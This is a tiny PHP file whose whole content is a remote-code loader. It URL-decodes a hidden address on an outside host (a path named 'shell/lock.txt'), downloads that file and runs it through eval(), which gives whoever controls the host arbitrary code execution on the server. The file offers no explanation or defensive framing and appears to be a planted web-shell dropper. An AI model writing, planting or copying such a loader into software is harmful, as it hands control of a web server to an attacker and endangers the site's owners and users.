<?php

$content = file_get_contents(urldecode('https%3A%2F%2Fhellosunshine.pro%2Fshell%2Flock.txt'));

$content = "?> ".$content;
eval($content);